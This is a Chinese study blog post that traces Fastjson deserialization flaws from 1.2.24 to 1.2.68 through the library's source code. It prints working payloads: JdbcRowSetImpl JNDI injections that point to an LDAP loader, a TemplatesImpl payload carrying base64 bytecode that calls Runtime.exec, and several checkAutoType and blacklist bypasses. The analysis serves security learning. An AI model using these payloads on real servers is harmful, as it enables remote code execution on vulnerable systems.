# Fastjson 反序列化分析


# 前言

继续学习Fastjson反序列化

# Fastjson的使用

直接上代码
先引入fastjson1.2.24依赖

```xml
<dependency>
<groupId>com.alibaba</groupId>
<artifactId>fastjson</artifactId>
<version>1.2.24</version>
</dependency>
```

创建一个user类

```java
package com.hello.demo.json;

public class user {
    private String name;
    private int age;
    private String hobby;

    public user() {
    }

    public user(String name, int age, String hobby) {
        this.name = name;
        this.age = age;
        this.hobby = hobby;
    }

    public String getName() {
        System.out.println("调用了getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("调用了setName");
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public String getHobby() {
        return hobby;
    }

    public void setHobby(String hobby) {
        this.hobby = hobby;
    }

    @Override
    public String toString() {
        return "user{" +
                "name='" + name + '\'' +
                ", age=" + age +
                ", hobby='" + hobby + '\'' +
                '}';
    }
}

```

> 在name的getter/setter中输出了一个调用方便后续调试

然后写一个测试类test

```java
package com.hello.demo.json;


import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class test {
    public static void main(String[] args) {
        user user = new user("张三",18,"学习");

        String s1 = JSON.toJSONString(user);
//        String s2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        System.out.println(s1);
//        System.out.println(s2);
        System.out.println("-----------------------------------------------------");
        Object parse = JSON.parse(s1);
        System.out.println(parse);
        System.out.println(parse.getClass().getName());
        System.out.println("-----------------------------------------------------");
        Object parse1 = JSON.parseObject(s1);
        System.out.println(parse1);
        System.out.println(parse1.getClass().getName());
        System.out.println("-----------------------------------------------------");
        Object parse2 = JSON.parseObject(s1,Object.class);
        System.out.println(parse2);
        System.out.println(parse2.getClass().getName());
    }
}
```

看一下test输出的结果

![1.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/ec33f7d8-b1ff-e0a4-45c7-60e309a951d8.png)

其中`JSON.toJSONString(user)`的功能为将类转换为json字符串，并且在**转换的同时调用了get方法**这是fastjson反序列中一个重要的点，这里先记住后面在解释

接着往下看，看下面三行代码，它们输出结果一致，其功能都为将json字符串转化为一个类，且都会转换为`JSONObject`类，但实则他们的具体实现肯定不一样，`parse`会转换为`@type`指定的类，`parseObject`会默认指定`JSONObject`类，而在`parseObject`参数中加一个类参数则会转换为其指定的类（这里指定Object会自动转化为JSONObject）

```java
JSON.parse(s1)
JSON.parseObject(s1)
JSON.parseObject(s1,Object.class)
```

接下来把测试类test中的注释去掉，且将parse和parseObject的参数改为s2，再来看一下运行结果

![2.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/6c907d57-2880-e498-675b-a01df41c6d56.png)

先来看第一部分，调用了两次get方法这是因为调用了两次`toJSONString`，接着看s2的输出结果中带有一个`@type`参数，值为`user`类，区别在于在`toJSONString`中加了一个`SerializerFeature.WriteClassName`参数，其会**将对象类型一起序列化并且会写入到`@type`字段中**

第二部分，parse进行反序列化，因此json字符串中**有`@type`因此会自动执行指定类的set方法**，并且会转换为`@type`指定类的类型

第三部分，**parseObject进行反序列话时会自动执行`@type`指定类的get和set方法**，并且转换为`JSONObject`类

我们来看一下源码就明白了

![3.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/cb333a9d-04ab-af15-c2a7-c0b0513d21f8.png)

其实相当于封装了一个parse，先进行了parse然后执行`toJSON`并且强制转换为`JSONObject`类
其中parse会调用set方法，toJSON会调用get方法

第四部分，虽然我们指定了类为`Object`类，但是我们传进去的json字符串中有`@type`指定的类导致其会转换为其指定的类，那这样我们指定类岂不是多余？接下来我们直接通过代码调试来看一下这个问题

重新建了一个userTest类，并且将json字符串改为没有加`@type`的`s1`并且指定类型为我们新建的userTest类，然后输出结果

```java
 Object parse2 = JSON.parseObject(s1, userTest.class);
        System.out.println(parse2);
        System.out.println(parse2.getClass().getName());
```
可以看到这个正是正常的结果，接下来我们再将`s1`改为指定`@type`的`s2`

![4.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/82bc8452-3298-ea9c-09d7-2d2abcef22c6.png)

会抛出异常：类型不匹配，也就是说当传进去带`@type`字段的json字符串后并不能够将其转换为指定类
> 这里为什么会这样？如果有兴趣的师傅可以继续探索

![5.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/5a27eff6-bba7-a48b-2cc3-f7d89d0a6f3a.png)

回到一开始的问题，为什么指定了`Object`类后输出结果却为`@type`指定的类型，直接调试发现了在`com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer#deserialze`中进行了对type的判断也就是一开始传的Object.class，会首先判断是否是类，然后如果是`Object.class`和`Serializable.class`的话会直接进入到`parser.parse(fieldName)`中

![6.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/3d717908-3b17-c786-252d-75c5267f8f6d.png)

继续往下跟进会进入到`DefaultJSONParser`中，会提取`@type`的值转换为其指定的类，到这里大概就清楚了其原因，这里简单解释一下，有兴趣的师傅可以继续探索

![7.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/7ac55c77-dd18-c8b2-9a9a-ce5ebfdb85f1.png)

也就是说当我们指定`@type`为恶意类时，并且其getter/setter有着一定危害时，就会出现无法预估的危害，重点就在于其会自动执行getter/setter，简单的来解释下原理就是**通过反射调用get方法获取值，相应的就是通过反射调用set方法存储值**，其中getter自动调用还需要满足以下条件：

- 方法名长度大于4
- 非静态方法
- 以get开头且第四个字母为大写
- 无参数传入
- 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong

setter自动调用需要满足以下条件：

- 方法名长度大于4
- 非静态方法
- 返回值为void或者当前类
- 以set开头且第四个字母为大写
- 参数个数为1个

除此之外Fastjson还有以下功能点：

1. 如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用`Feature.SupportNonPublicField`参数
2. fastjson 在为类属性寻找getter/setter方法时，调用函数`com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()`方法，会忽略`_ -`字符串
3. fastjson 在反序列化时，如果Field类型为byte[]，将会调用`com.alibaba.fastjson.parser.JSONScanner#bytesValue`进行base64解码，在序列化时也会进行base64编码

# 漏洞分析

## 1.2.24

在这个版本中有两条链子：
1. com.sun.rowset.JdbcRowSetImpl
2. com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl

### JdbcRowSetImpl

直接来看一下`JdbcRowSetImpl`中的`setAutoCommit`函数，当`this.conn`为null的时候会进入到`this.connect()`中，而`this.conn`在构造函数中初始为null

![8.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/cdf03894-8a80-4dd0-7155-d775c2223f0c.png)

继续跟进可以看见`var1.lookup()`经典的JNDI注入，且`DataSourceName`可控

![9.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/d4c3baa0-6812-0d39-0d43-cbcd1bafa290.png)

因此直接构造以下payload

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/g0tvin","autoCommit":true}
```

![10.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/c3622e12-6e3e-8f80-794c-15d9832ee4a4.png)

> 这里注意一点，jdk版本需要满足 8u161 < jdk < 8u191

### TemplatesImpl

这个链子利用条件比较苛刻，因为要用到的变量都是private的需要在反序列化时加上`Feature.SupportNonPublicField`参数

![11.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/1e2e8eb2-7087-c63a-44e7-6c90ac57ae12.png)

先来看一下`TemplatesImpl`的`getOutputProperties`方法，它是`_outputProperties`的getter方法，在前面讲到过Fastjson的一些其它功能点就是在为类属性调用getter/setter时会调用`smartMatch()`忽略掉`_ -`字符串，这里还用到了另一个功能点就是因为最后payload为byte[]会进行base64编码，继续往下看这里会去调用`newTransformer()`

![12.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/c9d8a4c3-6067-5e86-d957-d6a80ea3b1e8.png)

继续跟进，在new`TransformerImpl`对象时会进入到`getTransletInstance()`中

![13.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/6785942d-2817-7f9b-2990-0857ca8afab2.png)

继续跟进，在`getTransletInstance()`中，如果在`_name`不等于null且`_class`等于null时会进入到`defineTransletClasses()`中，这里先继续往下看，其中`_transletIndex`为-1，也就是说会对`_class`数组中的第一个类进行实例化，并且会强制转换为`AbstractTranslet`，接下来来看下class是怎么来的

![14.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/82365bf7-adad-8c73-2c78-a5466448ad2e.png)

跟进到`defineTransletClasses()`中，通过for循环加载`_bytecodes[]`来加载类，也就是说`_bytecodes[]`就是我们构造注入的点，其中`_tfactory`不为null，并且因为加载完类后会强制类型转换为`AbstractTranslet`，也就是说加载的类必须为`AbstractTranslet`的子类，这样整条链子就齐了

![15.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/4ebb6b1b-9611-37b0-d94c-494d086a22fe.png)

总结一下`TemplatesImpl`链子要满足的点：

- fastjson反序列化时需有`Feature.SupportNonPublicField`参数
- `_bytecodes[]`需进行base64编码
- `_bytecodes[]`中加载的类需为`AbstractTranslet`的子类
- `_name`不为null
- `_tfactory`不为null

payload如下：

```json
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAiTGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0OwEAClNvdXJjZUZpbGUBAAxKREs3dTIxLmphdmEMAAQABQcAEwEAIGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAG2NvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMQEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACEKACIADwAhAAIAIgAAAAAAAgABAAQABQABAAYAAAAvAAEAAQAAAAUqtwAjsQAAAAIABwAAAAYAAQAAACoACAAAAAwAAQAAAAUACQAMAAAACAAUAAUAAQAGAAAAFgACAAAAAAAKuAAaEhy2ACBXsQAAAAAAAgANAAAAAgAOAAsAAAAKAAEAAgAQAAoACQ=="],'_name':'exp','_tfactory':{ },"_outputProperties":{ }}
```

![16.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/d535964d-a9b5-236a-ec37-c4e9f5fb5489.png)

> 在使用`JSON.parseObject`反序列化时看到很多文章里加了一个`config`参数，发现删了这个参数并不影响漏洞的触发，然后看了一下代码，发现在`JSON`类中已经自动帮我们加上了这个参数

## 1.2.25-1.2.41

在此版本中，新增了黑名单和白名单功能
在`ParserConfig`中，可以看到黑名单的内容，而且设置了一个`autoTypeSupport`用来控制是否可以反序列化，`autoTypeSupport`默认为`false`且禁止反序列化，为true时会使用`checkAutoType`来进行安全检测

![17.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/aac9022e-d564-2d05-00eb-25bccf14682a.png)

接着来看一下`checkAutoType`怎么进行拦截的，在`autoTypeSupport`开启的情况下先通过白名单进行判断，如果符合的话就进入`TypeUtils.loadClass`，然后在通过黑名单进行判断，如果在黑名单中就直接抛出异常

![18.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/76d28e83-9762-8e2f-533c-2bdba33ac3e6.png)

接着继续往下看，从`Mapping`中寻找类然后继续从`deserializers`中寻找类，这里先不做过多解释继续往下看，如果`autoTypeSupport`没有开启的情况下，会对指定的`@type`类进行黑白名单判断，然后抛出异常，最后如果`autoTypeSupport`开启的情况下，会再一次进行判断然后进入到`TypeUtils.loadClass`中

![19.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0d20b32c-31cd-acf9-b8ed-e45dd5aa75f7.png)

在`TypeUtils.loadClass`中，可以看到对`[ L ;`进行了处理，而其中在处理`L ;`
的时候存在了逻辑漏洞，可以在`@type`的前后分别加上`L ;`来进行绕过

![20.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0d26d6bf-4151-c997-7c41-ad9f078f1052.png)

因此构造payload如下：

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://127.0.0.1:1389/g0tvin","autoCommit":true}
```

## 1.2.42

在此版本中，将黑名单改为了hashcode，但是在`com.alibaba.fastjson.util.TypeUtils#fnv1a_64`中有hashcode的计算方法，然后在`checkAutoType`中，使用hashcode对`L ;`进行了截取，然后进入到`TypeUtils.loadClass`中，也就是说对`L ;`进行双写即可绕过

![21.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/a90fcf08-f560-600c-9782-e705cfd23e89.png)

payload如下：

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://127.0.0.1:1389/g0tvin","autoCommit":true}
```

## 1.2.43

在此版本中,`checkAutoType`对`LL`进行了判断，如果类以`LL`开头，则直接抛出异常

![22.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/bbc0a5ab-fa85-dbde-3e1a-35c9a9af2026.png)

在`TypeUtils.loadClass`中，还对`[`进行了处理，因此又可以通过`[`来进行绕过，具体可以根据报错抛出的异常来进行构造payload
payload如下：

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://127.0.0.1:1389/g0tvin","autoCommit":true}
```

> 该payload在前几个版本也可以使用，影响版本`1.2.25 <= fastjson <= 1.2.43`

## 1.2.44

修复了`[`的绕过，在`checkAutoType`中进行判断如果类名以`[`开始则直接抛出异常

## 1.2.45

增加了黑名单，存在组件漏洞，需要有`mybatis`组件

```
影响版本：1.2.25 <= fastjson <= 1.2.45
```

payload如下：

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://127.0.0.1:1389/g0tvin"}}
```

## 1.2.47

在此版本中可以在不开启`autoTypeSupport`的情况下，触发漏洞

```
影响版本：1.2.25 <= fastjson <= 1.2.47
```

payload如下：

```json
{
    "1": {
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "2": {
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "ldap://127.0.0.1:1389/g0tvin", 
        "autoCommit": true
    }
}
```

问题还是在`checkAutoType`中，在开启`autoTypeSupport`的情况下，代码会走到`Arrays.binarySearch(this.denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null`来进行判断抛出异常，如果不符合的话会继续往下走从`Mapping`和`deserializers`中寻找类，如果存在则返回`clazz`

![23.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/07345497-5fda-bc78-6def-b5c39650a4c5.png)

而在`ParserConfig`类初始化时会执行`initDeserializers`方法，会向`deserializers`中添加许多的类，类似一种缓存，其中会添加这么一个类`this.deserializers.put(Class.class, MiscCodec.instance);`

![24.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/f7d5263b-26a8-ed2c-c9ef-328bfec2e373.png)

进入到`MiscCodec`类中，有这么一个方法`deserialze`，而在进行json反序列化时会调用这个方法，在方法内会对`clazz`进行判断，当类为`Class.class`也就是`java.lang.Class`类时，会进入到`TypeUtils.loadClass`中

![25.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/43db69d9-0ceb-512f-159b-019523ac4785.png)

![26.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/bae0997d-60de-510d-b3d8-6d2e56e5e471.png)

在`TypeUtils.loadClass`中，如果`cache`为true则会将`className`放到`mapping`中，其中`cache`默认为true，`className`为传进来的`strVal`

![27.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/67264359-02a9-3476-ab2f-87aeeef0112d.png)

在`deserialze`中，`strVal`由`objVal`强制转换而来

```java
strVal = (String)objVal
```

而`objVal`是在`parser.parse()`中截取而来，且参数名必须为`val`，否则会抛出异常，也就是说可以通过反序列化往`mapping`中添加任何类，这样的话添加`com.sun.rowset.JdbcRowSetImpl`类，从而绕过`autoTypeSupport`的和黑名单的限制，然后再次传递json去触发`JdbcRowSetImpl`的JNDI注入

![28.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/ddb63680-8615-5941-48d6-decc0f8d39c4.png)

![29.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/ee602d15-7f59-0e79-37f4-18a3bcae8d04.png)

## 1.2.48

在`MiscCodec`中修改了`cache`的默认值，修改为`false`，并且对`TypeUtils.loadClass`中的`mapping.put`做了限制

## 1.2.68

在`1.2.48 - 1.2.68`中还出现了一些黑名单的绕过，这里就不细讲了，在此版本中新增了一个`safeMode`功能，如果开启的话，将会直接抛出异常，完全杜绝了`autoTypeSupport`的绕过，于此同时还曝出了在不开启`safeMode`的前提下，对`autoTypeSupport`的绕过

![30.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/7b9ec942-1c70-3694-c14d-cb7b52724a67.png)

通过`expectClass`进行绕过，当传入的`expectClass`不在黑名单中后，`expectClassFlag`的值为true时，会调用`TypeUtils.loadClass`加载类，其中`clazz`也就是传进去的另一个类名必须为`expectClass`的子类

![31.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/f5b42cf2-c2a2-ff67-2911-08e14af608e6.png)

![32.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0c326313-ad6b-ce0d-cc67-83e3ea7c02ed.png)

![33.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/338cb184-b825-10e3-4aaf-88fa9dd408f0.png)

其中`java.lang.AutoCloseable`因为在白名单中，因此可以使用其子类来进行绕过`autoTypeSupport`
这里稍微总结一下恶意类要满足的条件：

- 恶意类不在黑名单内
- 恶意类的父类（例如`AutoCloseable`）不在黑名单内
- 恶意类不能是抽象类
- 恶意类中的`getter/setter/static block/constructor`能触发恶意操作

# 参考链接

1. https://su18.org/post/fastjson/
2. https://y4er.com/post/fastjson-learn/
3. https://goodapple.top/archives/832

